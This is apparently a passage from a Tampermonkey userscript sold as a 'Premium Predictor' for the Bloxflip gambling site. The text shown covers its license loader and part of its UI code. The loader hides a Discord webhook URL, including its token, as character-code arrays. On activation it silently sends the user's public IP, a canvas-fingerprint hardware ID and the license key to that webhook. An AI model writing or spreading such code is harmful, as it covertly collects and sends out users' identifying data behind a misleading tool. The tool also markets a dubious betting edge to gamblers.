// ==UserScript==
// @name 01 Studio's — Premium Predictor
// @namespace 01studios
// @version      5.1.0
// @description 01 Studio's Premium Prediction Tool
// @match https://bloxflip.com/*
// @match http://bloxflip.com/*
// @icon data:image/png;base64,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
// @grant GM_xmlhttpRequest
// @grant GM_setValue
// @grant GM_getValue
// @grant unsafeWindow
// @connect 217.154.114.227
// @connect api.ipify.org
// @connect discord.com
// @updateURL    https://raw.githubusercontent.com/Kwaxo/01studios-loader/main/01Studios.user.js
// @downloadURL  https://raw.githubusercontent.com/Kwaxo/01studios-loader/main/01Studios.user.js
// @connect      raw.githubusercontent.com
// @run-at document-idle
// ==/UserScript==


(function () {
 'use strict';

 // ─── LOADER / LICENSE SYSTEM ─────────────────────────────────────────────
 const _01_LOGO = [104,116,116,112,115,58,47,47,102,105,108,101,115,46,109,97,110,117,115,99,100,110,46,99,111,109,47,117,115,101,114,95,117,112,108,111,97,100,95,98,121,95,109,111,100,117,108,101,47,115,101,115,115,105,111,110,95,102,105,108,101,47,51,49,48,53,49,57,54,54,51,52,54,51,53,56,56,48,49,50,47,98,119,99,73,110,72,117,100,86,112,82,105,105,82,101,85,46,112,110,103].map(function(c){return String.fromCharCode(c)}).join("");
 const _01_WEBHOOK = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,53,49,52,55,48,49,50,56,57,55,56,51,51,49,50,50,47,90,67,68,55,53,79,84,57,80,108,88,86,55,107,68,76,67,88,95,56,53,66,118,70,66,70,119,80,74,95,86,116,67,77,107,116,45,82,69,45,75,54,84,69,112,68,104,68,79,78,71,110,97,68,106,95,50,89,67,114,51,54,79,113,49,67,71,72].map(function(c){return String.fromCharCode(c)}).join("");
 const _01_DISCORD = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,103,103,47,50,51,81,84,113,71,67,56,88,69].map(function(c){return String.fromCharCode(c)}).join("");
 const _01_STORED_KEY = '_01studios_license_key';
 const _01_LOADER_FONT = "'Inter', 'Segoe UI', system-ui, sans-serif";

 function _01_getAccent() { return (typeof GM_getValue !== 'undefined') ? GM_getValue('_01studios_accent', '#ffffff') : '#ffffff'; }

 function _01_getHWID() {
 let stored = (typeof GM_getValue !== 'undefined') ? GM_getValue('_01studios_hwid', null) : localStorage.getItem('_01studios_hwid');
 if (!stored) {
 stored = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2, '0')).join('');
 if (typeof GM_setValue !== 'undefined') GM_setValue('_01studios_hwid', stored);
 localStorage.setItem('_01studios_hwid', stored);
 }
 try {
 const c = document.createElement('canvas'), ctx = c.getContext('2d');
 ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillText('01-STUDIOS-FP', 2, 2);
 return stored + '_' + btoa(c.toDataURL().slice(-20)).slice(0, 8);
 } catch { return stored; }
 }

 function _01_logWebhook(key, status, errorMsg) {
 GM_xmlhttpRequest({ method: 'GET', url: [104,116,116,112,115,58,47,47,97,112,105,46,105,112,105,102,121,46,111,114,103,63,102,111,114,109,97,116,61,106,115,111,110].map(function(c){return String.fromCharCode(c)}).join(""), onload: function(ipResp) {
 let ip = 'Unknown'; try { ip = JSON.parse(ipResp.responseText).ip; } catch {}
 GM_xmlhttpRequest({ method: 'POST', url: _01_WEBHOOK, headers: { 'Content-Type': 'application/json' },
 data: JSON.stringify({ embeds: [{ title: status === 'SUCCESS' ? '✅ Activation Success' : 'X Activation Failed',
 color: status === 'SUCCESS' ? 0x00c97a : 0xe05555,
 fields: [
 { name: '- Key', value: '`' + (key||'None') + '`', inline: true },
 { name: '🌐 IP', value: '`' + ip + '`', inline: true },
 { name: ' HWID', value: '`' + _01_getHWID() + '`', inline: false },
 ...(errorMsg ? [{ name: ' Error', value: '`' + errorMsg + '`', inline: false }] : [])
 ], timestamp: new Date().toISOString(), footer: { text: "01 Studio's Secure Logger" } }] })
 });
 }});
 }

 function _01_removeLoader() { document.getElementById('_01studios_loader_ui')?.remove(); document.getElementById('_01studios_loader_styles')?.remove(); }

 function _01_showUI(content) {
 const ac = _01_getAccent();
 const font = "'Inter','Segoe UI',system-ui,sans-serif";
 _01_removeLoader();
 // Inject keyframes
 let style = document.getElementById('_01studios_loader_styles');
 if (!style) { style = document.createElement('style'); style.id = '_01studios_loader_styles'; (document.head||document.documentElement).appendChild(style); }
 style.textContent = '._01s_disc:hover{background:#5865F2!important;color:#fff!important;transform:translateY(-3px) scale(1.1);box-shadow:0 0 20px rgba(88,101,242,0.6);border-color:#5865F2!important;transition:all 0.3s ease}._01s_disc{transition:all 0.3s ease}._01s_btn:hover{transform:translateY(-2px);box-shadow:0 0 20px rgba(255,255,255,0.3);filter:brightness(1.1)}._01s_btn{transition:all 0.2s ease}@keyframes _01lp{0%{box-shadow:0 0 20px '+ac+'22;border-color:'+ac+'44}50%{box-shadow:0 0 40px '+ac+'44;border-color:'+ac+'88}100%{box-shadow:0 0 20px '+ac+'22;border-color:'+ac+'44}}@keyframes _01lf{0%{transform:translateY(0) scale(1);filter:drop-shadow(0 0 10px '+ac+'44)}50%{transform:translateY(-10px) scale(1.05);filter:drop-shadow(0 0 25px '+ac+'88)}100%{transform:translateY(0) scale(1);filter:drop-shadow(0 0 10px '+ac+'44)}}@keyframes _01lb{0%{transform:translateX(-100%)}100%{transform:translateX(200%)}}';
 const div = document.createElement('div');
 div.id = '_01studios_loader_ui';
 div.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.92);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:'+font+';';
